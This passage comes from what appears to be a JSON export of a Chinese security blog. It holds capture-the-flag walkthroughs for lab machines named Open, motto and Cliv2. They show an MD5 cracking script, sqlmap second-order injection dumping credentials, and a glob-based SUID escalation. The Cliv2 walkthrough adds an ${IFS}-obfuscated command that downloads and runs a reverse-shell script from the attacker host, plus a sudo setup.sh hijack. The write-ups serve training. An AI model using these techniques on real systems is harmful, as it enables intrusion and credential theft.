md5sum`\uff0c\u8fd9\u610f\u5473\u7740\u88ab\u54c8\u5e0c\u7684\u539f\u59cb\u5bc6\u7801\u5b57\u7b26\u4e32\u672b\u5c3e\u4f1a\u5305\u542b\u4e00\u4e2a\u6362\u884c\u7b26 (`\\n`)\u3002\n\n\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684 Python \u811a\u672c\uff0c\u9488\u5bf9\u5305\u542b\u6362\u884c\u7b26\u7684\u5bc6\u7801\u8fdb\u884c\u7206\u7834\uff0c\u6700\u7ec8\u6210\u529f\u7834\u89e3\u51fa `root` \u7528\u6237\u7684\u5bc6\u7801\u4e3a `do167watt041`\u3002\n\n```python\nimport threading\nimport hashlib\n\nf = '/usr/share/wordlists/rockyou.txt'\nh = '6cd1f22e65d26246530ff7a2528144e3'\nfnd = False\nthd = 1000  \n\ndef md5chk(w):\n    global fnd\n    if fnd:\n        return\n    m = hashlib.md5(w).hexdigest()\n    if m == h:\n        with threading.Lock():\n            if not fnd:\n                fnd = True\n                print(f'\\n[+] \u547d\u4e2d: {w.decode().strip()}')\n        exit()\n\n\nwith open(f, 'rb') as fd:\n    lines = fd.readlines()\n\nprint('\u7206\u7834\u4e2d...')\n\ndef worker(line):\n    global fnd\n    if not fnd:\n        md5chk(line)\n\nts = []\nfor line in lines:\n    if fnd:\n        break\n    \n    while threading.active_count() > thd:\n        pass\n    t = threading.Thread(target=worker, args=(line,))\n    t.start()\n    ts.append(t)\n\n\nfor t in ts:\n    t.join()\n\nif not fnd:\n    print('\\n[-] \u672a\u627e\u5230\u5339\u914d\u9879')\n```\n\n\u4f7f\u7528\u8be5\u5bc6\u7801\u6210\u529f\u5207\u6362\u5230 `root` \u7528\u6237\u3002\n\n```bash\nmiao@Open:/tmp$ su -\nPassword: do167watt041\nroot@Open:~# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n### **\u56db\u3001\u593a\u53d6\u65d7\u5e1c**\n\n\u83b7\u53d6 root \u6743\u9650\u540e\uff0c\u8bfb\u53d6\u6240\u6709\u65d7\u5e1c\u6587\u4ef6\u3002\n\n```bash\nroot@Open:~# cat /home/miao/user.txt \nflag{user-b026324c6904b2a9cb4b88d6d61c81d1}\n\nroot@Open:~# cat /root/root.txt \nflag{root-6cd1f22e65d26246530ff7a2528144e3}\n```sentence", "top": 0, "createdAt": 1754441497, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P187": {"htmlDir": "docs/post/nei-bu-_motto.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_motto", "postUrl": "post/nei-bu-_motto.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/187", "commentNum": 0, "wordCount": 4476, "description": "![image-20250802195125109](http://7r1UMPHK.github.io/image/20250802195134238.webp)\n\n# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u4f7f\u7528 `arp-scan` \u5bf9\u672c\u5730\u7f51\u7edc\u8fdb\u884c\u626b\u63cf\uff0c\u8bc6\u522b\u51fa\u76ee\u6807\u4e3b\u673a\u7684 IP \u5730\u5740\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l               \nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n...\n192.168.205.237 08:00:27:C5:BA:A3       PCS Systemtechnik/Oracle VirtualBox virtual NIC\n...\n```\n\n**\u76ee\u6807\u4e3b\u673aIP\uff1a** `192.168.205.237`\n\n## 2. \u7aef\u53e3\u4e0e\u670d\u52a1\u626b\u63cf\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5f00\u653e\u7684\u7aef\u53e3\u53ca\u8fd0\u884c\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.237\nStarting Nmap 7.95 ( https://nmap.org )\nNmap scan report for 192.168.205.237\nHost is up (0.0016s latency).\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n9090/tcp open  zeus-admin\n```\n\n**\u626b\u63cf\u7ed3\u679c\u6c47\u603b\uff1a**\n\n| \u7aef\u53e3     | \u72b6\u6001 | \u670d\u52a1              | \u63a8\u65ad                                           |\n| :------- | :--- | :---------------- | :--------------------------------------------- |\n| 22/tcp   | open | ssh               | \u8fdc\u7a0b\u7ba1\u7406\u670d\u52a1\uff0c\u53ef\u7528\u4e8e\u540e\u7eed\u767b\u5f55                   |\n| 80/tcp   | open | http              | Web \u670d\u52a1\uff0c\u4e3a\u4e00\u4e2a JavaScript \u5c0f\u6e38\u620f\uff0c\u672a\u53d1\u73b0\u6f0f\u6d1e |\n| 9090/tcp | open | zeus-admin (http) | \u53e6\u4e00\u4e2a Web \u670d\u52a1\uff0c\u662f\u672c\u6b21\u653b\u51fb\u7684\u4e3b\u8981\u5165\u53e3          |\n\n# \u4e8c\u3001\u521d\u59cb\u8bbf\u95ee\u4e0e\u6f0f\u6d1e\u5229\u7528\n\n## Web \u6e17\u900f (Port 9090): \u4e8c\u9636 SQL \u6ce8\u5165\n\n### 1. \u6f0f\u6d1e\u53d1\u73b0\n\n\u8bbf\u95ee `http://192.168.205.237:9090`\uff0c\u7ecf\u8fc7\u624b\u52a8\u529f\u80fd\u6d4b\u8bd5\uff0c\u53d1\u73b0\u8be5 Web \u5e94\u7528\u5b58\u5728\u4e24\u4e2a\u5173\u952e\u9875\u9762\uff1a\n*   `/myinfo`\uff1a\u5141\u8bb8\u5df2\u8ba4\u8bc1\u7528\u6237\u4fee\u6539\u81ea\u5df1\u7684\u6635\u79f0 (`nickname`)\u3002\n*   `/mymottos`\uff1a\u663e\u793a\u7528\u6237\u7684\u6635\u79f0\u548c\u5ea7\u53f3\u94ed\u4fe1\u606f\u3002\n\n\u6d4b\u8bd5\u53d1\u73b0\uff0c\u5728 `/myinfo` \u9875\u9762\u63d0\u4ea4\u7684 `nickname` \u53c2\u6570\u672a\u7ecf\u8fc7\u6ee4\u5c31\u5b58\u5165\u4e86\u6570\u636e\u5e93\u3002\u5f53\u7528\u6237\u8bbf\u95ee `/mymottos` \u9875\u9762\u65f6\uff0c\u7cfb\u7edf\u4ece\u6570\u636e\u5e93\u4e2d\u8bfb\u53d6\u8be5\u6635\u79f0\u5e76\u62fc\u63a5\u5230 SQL \u67e5\u8be2\u4e2d\uff0c\u4ece\u800c\u89e6\u53d1\u4e86 SQL \u6ce8\u5165\u3002\u8fd9\u662f\u4e00\u4e2a\u5178\u578b\u7684**\u4e8c\u9636 SQL \u6ce8\u5165 (Second-Order SQL Injection)**\u3002\n\n### 2. sqlmap \u6f0f\u6d1e\u5229\u7528\n\n\u7531\u4e8e\u8be5\u6ce8\u5165\u9700\u8981\u5148\u5728\u4e00\u4e2a\u9875\u9762\uff08`/myinfo`\uff09\u63d0\u4ea4 Payload\uff0c\u7136\u540e\u5728\u53e6\u4e00\u4e2a\u9875\u9762\uff08`/mymottos`\uff09\u89c2\u5bdf\u7ed3\u679c\uff0c\u56e0\u6b64\u9700\u8981\u4f7f\u7528 `sqlmap` \u7684 `--second-url` \u53c2\u6570\u8fdb\u884c\u81ea\u52a8\u5316\u5229\u7528\u3002\u540c\u65f6\uff0c\u6240\u6709\u8bf7\u6c42\u90fd\u9700\u8981\u6709\u6548\u7684 JWT Cookie \u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u53ef\u4ee5\u901a\u8fc7\u6293\u53d6\u4e00\u4e2a\u5408\u6cd5\u7684\u8bf7\u6c42\u5305\u5e76\u4f7f\u7528 `-r` \u53c2\u6570\u52a0\u8f7d\u3002\n\n**`sqlmap` \u5229\u7528\u6b65\u9aa4\uff1a**\n\n1.  **\u6293\u53d6\u8bf7\u6c42\u5305**\uff1a\u4f7f\u7528 Burp Suite \u7b49\u5de5\u5177\u6293\u53d6\u4e00\u4e2a\u4ece `/myinfo` \u9875\u9762\u4fee\u6539\u6635\u79f0\u7684 POST \u8bf7\u6c42\uff0c\u5e76\u4fdd\u5b58\u4e3a `1.txt`\u3002\n\n2.  **\u83b7\u53d6\u6570\u636e\u5e93\u4fe1\u606f**\uff1a\n    ```bash\n    sqlmap -r 1.txt --batch --second-url 'http://192.168.205.237:9090/mymottos' --dbs\n    ```\n\n3.  **\u83b7\u53d6\u8868\u4fe1\u606f**\uff1a\n    ```bash\n    sqlmap -r 1.txt --batch --second-url 'http://192.168.205.237:9090/mymottos' -D sql --tables\n    ```\n\n4.  **\u8f6c\u50a8\u51ed\u8bc1\u6570\u636e**\uff1a\u4ece `register_infos` \u8868\u4e2d\u8f6c\u50a8\u7528\u6237\u51ed\u8bc1\u3002\n    ```bash\n    sqlmap -r 1.txt --batch --second-url 'http://192.168.205.237:9090/mymottos' -D sql -T register_infos --dump\n    ```\n\n\u901a\u8fc7\u4e0a\u8ff0\u64cd\u4f5c\uff0c\u6210\u529f\u83b7\u53d6\u5230\u7528\u6237 `redbean` \u7684 SSH \u767b\u5f55\u51ed\u8bc1\u3002\n\n### 3. \u83b7\u53d6\u521d\u59cb\u8bbf\u95ee Shell\n\n\u4f7f\u7528\u83b7\u53d6\u5230\u7684\u51ed\u8bc1\uff0c\u6210\u529f\u901a\u8fc7 SSH \u767b\u5f55\u5230\u76ee\u6807\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ ssh redbean@192.168.205.237\n...\nredbean@motto:~$ id\nuid=1001(redbean) gid=1001(redbean) groups=1001(redbean)\n```\n\n---\n\n# \u4e09\u3001\u6743\u9650\u63d0\u5347\n\n## 1. SUID \u6587\u4ef6\u53d1\u73b0\u4e0e\u4ee3\u7801\u5ba1\u8ba1\n\n\u767b\u5f55\u540e\uff0c\u9996\u5148\u641c\u7d22\u7cfb\u7edf\u4e2d\u7684 SUID \u6587\u4ef6\u4ee5\u5bfb\u627e\u63d0\u6743\u5411\u91cf\uff0c\u53d1\u73b0\u4e00\u4e2a\u975e\u6807\u51c6\u7684\u7a0b\u5e8f `/opt/run_newsh`\u3002\n\n```bash\nredbean@motto:~$ find / -perm -4000 -type f 2>/dev/null\n...\n/opt/run_newsh\n...\n```\n\n\u5728 `redbean` \u7684\u5bb6\u76ee\u5f55\u4e2d\u53d1\u73b0\u4e86\u4e00\u4e2a `.backup` \u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u5305\u542b\u4e86 `run_newsh.c` \u548c `new.sh` \u7684\u6e90\u4ee3\u7801\uff0c\u4e14\u6587\u4ef6\u53ef\u8bfb\u3002\n\n*   **`run_newsh.c`**\uff1a\u6b64 C \u7a0b\u5e8f\u7684\u529f\u80fd\u662f\u8bbe\u7f6e\u6709\u6548\u7528\u6237ID\u4e3a root (`setuid(0)`)\uff0c\u7136\u540e\u6267\u884c `/opt/newsh` \u811a\u672c\uff0c\u5e76\u5c06\u547d\u4ee4\u884c\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570 (`argv[1]`) \u4f20\u9012\u7ed9\u8be5\u811a\u672c\u3002\n*   **`new.sh`**\uff1a\u811a\u672c\u7684\u6838\u5fc3\u903b\u8f91\u5982\u4e0b\uff1a\n    ```bash\n    [ '$1' = 'flag' ] && exit 2\n    [ $1 = 'flag' ] && chmod +s /bin/bash \n    ```\n\n## 2. \u6f0f\u6d1e\u5206\u6790\uff1aShell \u8def\u5f84\u540d\u6269\u5c55\n\n\u4e0a\u8ff0\u811a\u672c\u4e2d\u5b58\u5728\u4e00\u4e2a\u7ecf\u5178\u7684\u5b89\u5168\u6f0f\u6d1e\uff1a\n*   **\u7b2c\u4e00\u884c `[ '$1' = 'flag' ]`**\uff1a\u4f7f\u7528\u4e86\u53cc\u5f15\u53f7\u5305\u88f9\u53d8\u91cf `$1`\uff0c\u8fd9\u4f1a\u5c06\u5176\u89c6\u4e3a\u4e00\u4e2a\u5b8c\u6574\u7684\u5b57\u7b26\u4e32\u3002\u56e0\u6b64\uff0c`'f*g'` \u4e0d\u4f1a\u7b49\u4e8e `'flag'`\uff0c\u68c0\u67e5\u4f1a\u5931\u8d25\uff0c\u811a\u672c\u7ee7\u7eed\u6267\u884c\u3002\n*   **\u7b2c\u4e8c\u884c `[ $1 = 'flag' ]`**\uff1a**\u6ca1\u6709\u4f7f\u7528\u53cc\u5f15\u53f7**\u3002\u5f53 `$1` \u7684\u503c\u5305\u542b\u901a\u914d\u7b26\uff08\u5982 `*` \u6216 `?`\uff09\u65f6\uff0cShell \u4f1a\u5728\u6267\u884c `[` (test) \u547d\u4ee4\u524d\u8fdb\u884c**\u8def\u5f84\u540d\u6269\u5c55**\u3002\u5982\u679c\u5f53\u524d\u76ee\u5f55\u4e0b\u5b58\u5728\u4e00\u4e2a\u540d\u4e3a `flag` \u7684\u6587\u4ef6\uff0c\u90a3\u4e48 `f*g` \u5c31\u4f1a\u88ab\u6269\u5c55\u4e3a `flag`\uff0c\u5bfc\u81f4 `[ flag = flag ]` \u7684\u5224\u65ad\u4e3a\u771f\u3002\n\n## 3. \u6f0f\u6d1e\u5229\u7528\n\n\u5229\u7528\u6b64\u7279\u6027\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u6b65\u9aa4\u4e3a `/bin/bash` \u6dfb\u52a0 SUID \u4f4d\uff1a\n\n1.  **\u5207\u6362\u5230\u53ef\u5199\u76ee\u5f55**\uff1a\u5207\u6362\u5230 `/tmp` \u76ee\u5f55\uff0c\u4ee5\u786e\u4fdd\u6211\u4eec\u6709\u6743\u9650\u521b\u5efa\u6587\u4ef6\uff0c\u5e76\u4e14\u907f\u514d\u5e72\u6270\u5176\u4ed6\u76ee\u5f55\u7ed3\u6784\u3002\n    ```bash\n    redbean@motto:~$ cd /tmp\n    ```\n\n2.  **\u521b\u5efa\u89e6\u53d1\u6587\u4ef6**\uff1a\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a `flag` \u7684\u6587\u4ef6\uff0c\u4e3a\u8def\u5f84\u540d\u6269\u5c55\u63d0\u4f9b\u5339\u914d\u76ee\u6807\u3002\n    ```bash\n    redbean@motto:/tmp$ touch flag\n    ```\n\n3.  **\u6267\u884cSUID\u7a0b\u5e8f**\uff1a\u4f7f\u7528\u4e00\u4e2a\u80fd\u5339\u914d\u5230 `flag` \u6587\u4ef6\u7684\u901a\u914d\u7b26\uff08\u5982 `f*g`\uff09\u4f5c\u4e3a\u53c2\u6570\u6267\u884c `/opt/run_newsh`\u3002\n    ```bash\n    redbean@motto:/tmp$ /opt/run_newsh 'f*g'\n    ```\n    \u6b64\u547d\u4ee4\u6210\u529f\u7ed5\u8fc7\u4e86\u7b2c\u4e00\u884c\u68c0\u67e5\uff0c\u5e76\u5728\u7b2c\u4e8c\u884c\u68c0\u67e5\u65f6\u89e6\u53d1\u4e86\u8def\u5f84\u540d\u6269\u5c55\uff0c\u6267\u884c\u4e86 `chmod +s /bin/bash`\u3002\n\n4.  **\u9a8c\u8bc1\u5e76\u83b7\u53d6 Root Shell**\uff1a\u68c0\u67e5 `/bin/bash` \u7684\u6743\u9650\uff0c\u786e\u8ba4\u5df2\u8bbe\u7f6e SUID \u4f4d\u3002\u7136\u540e\u4f7f\u7528 `-p` \u53c2\u6570\u542f\u52a8 `bash` \u4ee5\u4fdd\u7559 `euid`\uff08\u6709\u6548\u7528\u6237ID\uff09\u4e3a root\u3002\n    ```bash\n    redbean@motto:/tmp$ ls -al /bin/bash\n    -rwsr-xr-x 1 root root 1168776 ... /bin/bash\n    \n    redbean@motto:/tmp$ bash -p\n    bash-5.0# id\n    uid=1001(redbean) gid=1001(redbean) euid=0(root) groups=1001(redbean)\n    bash-5.0# whoami\n    root\n    ```\n    \u6210\u529f\u83b7\u53d6 root \u6743\u9650\u7684 shell\u3002\n\n---\n\n# \u56db\u3001\u593a\u53d6\u65d7\u5e1c\n\n\u83b7\u53d6 root \u6743\u9650\u540e\uff0c\u8bfb\u53d6\u4f4d\u4e8e\u7528\u6237\u5bb6\u76ee\u5f55\u548c root \u76ee\u5f55\u4e0b\u7684\u65d7\u5e1c\u6587\u4ef6\u3002\n\n```bash\nroot@motto:/# cat /home/redbean/user.txt\nflag{user-flag-placeholder-for-motto-user}\n\nroot@motto:/# cat /root/root.txt\nflag{root-flag-placeholder-for-motto-root}\n```sentence", "top": 0, "createdAt": 1754441525, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P188": {"htmlDir": "docs/post/nei-bu-_Cliv2.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Cliv2", "postUrl": "post/nei-bu-_Cliv2.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/188", "commentNum": 0, "wordCount": 4717, "description": "![image-20250803203858485](http://7r1UMPHK.github.io/image/20250803203858632.webp)\n\n# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u4f7f\u7528 `arp-scan` \u5728\u672c\u5730\u7f51\u7edc\u8fdb\u884c\u626b\u63cf\uff0c\u53d1\u73b0\u76ee\u6807\u4e3b\u673a IP \u5730\u5740\u4e3a `192.168.205.240`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.240 08:00:27:aa:bc:4b       PCS Systemtechnik GmbH\n...\n```\n\n## 2. \u7aef\u53e3\u4e0e\u670d\u52a1\u626b\u63cf\n\n\u901a\u8fc7 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u786e\u8ba4\u5176\u5f00\u653e\u4e86 22 (SSH), 53 (DNS) \u548c 80 (HTTP) \u7aef\u53e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.240\n...\nPORT   STATE SERVICE\n22/tcp open  ssh\n53/tcp open  domain\n80/tcp open  http\n```\n\n\u5bf9 DNS \u670d\u52a1\u8fdb\u884c\u7248\u672c\u4fa6\u5bdf\uff0c\u786e\u8ba4\u4e3a ISC BIND 9.16.50\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p53 -sC -sV 192.168.205.240\n...\nPORT   STATE SERVICE VERSION\n53/tcp open  domain  ISC BIND 9.16.50 (Debian Linux)\n| dns-nsid: \n|_  bind.version: 9.16.50-Debian\n...\n```\n\n## 3. Web \u4e0e DNS \u4fa6\u5bdf\n\n\u76f4\u63a5\u8bbf\u95ee\u76ee\u6807 IP \u7684 80 \u7aef\u53e3\uff0c\u9875\u9762\u4f1a\u81ea\u52a8\u91cd\u5b9a\u5411\u5230\u57df\u540d `http://cliv2.dsz/`\u3002\u56e0\u6b64\uff0c\u9996\u5148\u5728\u653b\u51fb\u673a\u4e0a\u914d\u7f6e `/etc/hosts` \u6587\u4ef6\uff0c\u5c06\u8be5\u57df\u540d\u6307\u5411\u76ee\u6807 IP\u3002\n\n```bash\n# \u5728 /etc/hosts \u6587\u4ef6\u4e2d\u6dfb\u52a0\n192.168.205.240 cliv2.dsz\n```\n\n\u7531\u4e8e\u76ee\u6807\u5f00\u653e\u4e86 DNS \u670d\u52a1\uff0c\u5c1d\u8bd5\u8fdb\u884c DNS \u533a\u57df\u4f20\u9001\uff08AXFR\uff09\u653b\u51fb\uff0c\u6210\u529f\u83b7\u53d6\u4e86\u591a\u4e2a\u5b50\u57df\u540d\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ dig axfr @192.168.205.240 cliv2.dsz\n...\ncliv2.dsz.              86400   IN      A       127.0.0.1\n3170a7.cliv2.dsz.       86400   IN      A       127.0.0.1\nclient.cliv2.dsz.       86400   IN      A       127.0.0.1\ndev.cliv2.dsz.          86400   IN      A       127.0.0.1\nns1.cliv2.dsz.          86400   IN      A       127.0.0.1\n...\n```\n\n\u5c06\u53d1\u73b0\u7684\u6240\u6709\u5b50\u57df\u540d\u4e00\u5e76\u6dfb\u52a0\u5230 `/etc/hosts` \u6587\u4ef6\u4e2d\uff0c\u4ee5\u4fbf\u540e\u7eed\u8bbf\u95ee\u3002\n\n```bash\n# \u66f4\u65b0 /etc/hosts \u6587\u4ef6\n192.168.205.240 cliv2.dsz 3170a7.cliv2.dsz client.cliv2.dsz dev.cliv2.dsz ns1.cliv2.dsz\n```\n\n# **\u4e8c\u3001\u521d\u59cb\u8bbf\u95ee**\n\n## Web \u6e17\u900f (RCE)\n\n\u5728\u63a2\u6d4b\u53d1\u73b0\u7684\u5b50\u57df\u540d\u4e2d\uff0c\u8bbf\u95ee `http://3170a7.cliv2.dsz/` \u53d1\u73b0\u4e00\u4e2a Web \u7ec8\u7aef\uff0c\u8be5\u7ec8\u7aef\u5141\u8bb8\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002\n\n\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u540e\u7aef\u5bf9\u8f93\u5165\u8fdb\u884c\u4e86\u8fc7\u6ee4\uff0c\u7981\u6b62\u4e86\u7a7a\u683c\u548c `-` \u7b49\u7279\u6b8a\u5b57\u7b26\u3002\u4e3a\u4e86\u7ed5\u8fc7\u7a7a\u683c\u9650\u5236\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 shell \u7684\u5185\u90e8\u5b57\u6bb5\u5206\u9694\u7b26 `${IFS}` \u6765\u4ee3\u66ff\u3002\n\n**\u653b\u51fb\u6b65\u9aa4:**\n\n1.  \u5728\u653b\u51fb\u673a (Kali) \u4e0a\u521b\u5efa\u4e00\u4e2a\u53cd\u5f39 shell \u811a\u672c (`reverse.sh`)\u3002\n2.  \u5728\u653b\u51fb\u673a\u4e0a\u5f00\u542f\u4e00\u4e2a\u4e34\u65f6\u7684 HTTP \u670d\u52a1\u5668\uff08\u4f8b\u5982 `python3 -m http.server 80`\uff09\u3002\n3.  \u5728 Kali \u4e0a\u5f00\u542f `netcat` \u76d1\u542c\u3002\n4.  \u6784\u9020\u7ed5\u8fc7\u7a7a\u683c\u9650\u5236\u7684\u6076\u610f\u547d\u4ee4\uff0c\u4e0b\u8f7d\u5e76\u6267\u884c\u53cd\u5f39 shell \u811a\u672c\u3002\n\n**\u6076\u610f\u547d\u4ee4:**\n\n```bash\ncd${IFS}/tmp/;busybox${IFS}wget${IFS}192.168.205.128/reverse.sh;bash${IFS}reverse.sh\n```\n\n\u5728 Web \u7ec8\u7aef\u6267\u884c\u4e0a\u8ff0\u547d\u4ee4\u540e\uff0c\u6210\u529f\u5728\u672c\u5730 `netcat` \u76d1\u542c\u5668\u4e0a\u63a5\u6536\u5230\u4e86\u6765\u81ea\u76ee\u6807\u670d\u52a1\u5668\u7684 `www-data` \u7528\u6237\u53cd\u5f39 shell\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.240] 53098\n...\nwww-data@Cliv2:/tmp$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## 1. \u4ece `www-data` \u5230 `bitc0de`\n\n\u83b7\u53d6\u521d\u59cb shell \u540e\uff0c\u5728 `/home` \u76ee\u5f55\u4e0b\u53d1\u73b0\u4e86\u7528\u6237 `bitc0de`\u3002\u8fdb\u4e00\u6b65\u68c0\u67e5 `/home/bitc0de` \u76ee\u5f55\uff0c\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a `...` \u7684\u53ef\u7591\u6587\u4ef6\u3002\n\n```bash\nwww-data@Cliv2:/home/bitc0de$ ls -al\n...\n-rw-r--r-- 1 root    root      17 Jul 25 23:51 ...\n-rw-r--r-- 1 root    root      44 Jul 25 22:35 user.txt\n...\nwww-data@Cliv2:/home/bitc0de$ cat ...\nMabEwReOmcpG!123\n```\n\n\u8bfb\u53d6\u8be5\u6587\u4ef6\u5185\u5bb9\uff0c\u83b7\u5f97\u4e86\u4e00\u4e2a\u5bc6\u7801 `MabEwReOmcpG!123`\u3002\u540c\u65f6\uff0c\u53d1\u73b0\u4e86 `user.txt`\uff0c\u8bfb\u53d6\u540e\u83b7\u5f97\u7b2c\u4e00\u4e2a flag\u3002\n\n```bash\nwww-data@Cliv2:/home/bitc0de$ cat user.txt \nflag{user-60b725f10c9c85c70d97880dfe8191b3}\n```\n\n\u4f7f\u7528\u83b7\u53d6\u7684\u5bc6\u7801\uff0c\u6210\u529f\u5207\u6362\u5230 `bitc0de` \u7528\u6237\u3002\n\n```bash\nwww-data@Cliv2:/home/bitc0de$ su bitc0de\nPassword: MabEwReOmcpG!123\nbitc0de@Cliv2:~$ id\nuid=1000(bitc0de) gid=1000(bitc0de) groups=1000(bitc0de)\n```\n\n## 2. \u4ece `bitc0de` \u5230 `root`\n\n\u6210\u4e3a `bitc0de` \u7528\u6237\u540e\uff0c\u6267\u884c `sudo -l` \u53d1\u73b0\u8be5\u7528\u6237\u53ef\u4ee5\u65e0\u5bc6\u7801\u4ee5 `ALL` \u6743\u9650\u6267\u884c `/usr/local/bin/hmvcli` \u811a\u672c\u3002\n\n```bash\nbitc0de@Cliv2:~$ sudo -l\n...\nUser bitc0de may run the following commands on Cliv2:\n    (ALL) NOPASSWD: /usr/local/bin/hmvcli\n```\n\n\u5206\u6790\u8be5 Python \u811a\u672c `/usr/local/bin/hmvcli` \u7684\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u5176\u4e2d\u4e00\u6bb5\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\uff1a\n\n```python\n...\nparser.add_argument('-c', '--config', action='store_true', help='Run the setup script to configure credentials')\nargs = vars(parser.parse_args())\n\nif args['config']:\n    print('[*] Ejecutando script de configuraci\u00f3n...')\n    subprocess.run(['bash', 'setup.sh'])  \n    sys.exit(0)\n...\n```\n\n\u5f53\u4f7f\u7528 `-c` \u6216 `--config` \u53c2\u6570\u8fd0\u884c\u6b64\u811a\u672c\u65f6\uff0c\u5b83\u4f1a\u4ee5 `root` \u6743\u9650\uff08\u56e0\u4e3a\u6211\u4eec\u7528\u4e86 `sudo`\uff09\u6267\u884c\u5f53\u524d\u76ee\u5f55\u4e0b\u7684 `setup.sh` \u6587\u4ef6\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u903b\u8f91\u6765\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\n\n**\u63d0\u6743\u6b65\u9aa4:**\n\n1.  \u5728 `bitc0de` \u7528\u6237\u6743\u9650\u4e0b\uff0c\u4e8e\u4efb\u610f\u53ef\u5199\u76ee\u5f55\uff08\u5982 `/home/bitc0de` \u6216 `/tmp`\uff09\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a `setup.sh` \u7684\u6587\u4ef6\u3002\n2.  \u5728 `setup.sh` \u4e2d\u5199\u5165\u63d0\u6743\u547d\u4ee4\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 `chmod +s /bin/bash` \u4e3a `bash` \u7a0b\u5e8f\u8bbe\u7f6e SUID \u4f4d\uff0c\u4f7f\u5176\u5728\u6267\u884c\u65f6\u83b7\u5f97\u6587\u4ef6\u6240\u6709\u8005\uff08\u5373 `root`\uff09\u7684\u6743\u9650\u3002\n3.  \u4ee5 `sudo` \u65b9\u5f0f\u8fd0\u884c `hmvcli` \u811a\u672c\u5e76\u5e26\u4e0a `-c` \u53c2\u6570\uff0c\u89e6\u53d1\u6f0f\u6d1e\u3002\n4.  \u6267\u884c `bash -p` \u4ee5 root \u6743\u9650\u542f\u52a8\u4e00\u4e2a\u65b0\u7684 shell\u3002\n\n```bash\nbitc0de@Cliv2:~$ cd /home/bitc0de\nbitc0de@Cliv2:~$ echo 'chmod +s /bin/bash' > setup.sh\nbitc0de@Cliv2:~$ sudo /usr/local/bin/hmvcli -c\n[*] Ejecutando script de configuraci\u00f3n...\nbitc0de@Cliv2:~$ ls -al /bin/bash\n-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash\nbitc0de@Cliv2:~$ bash -p\nbash-5.0# id\nuid=1000(bitc0de) gid=1000(bitc0de) euid=0(root) egid=0(root) groups=0(root),1000(bitc0de)\n```\n\n\u6210\u529f\u83b7\u53d6 `root` \u6743\u9650\u3002\n\n# 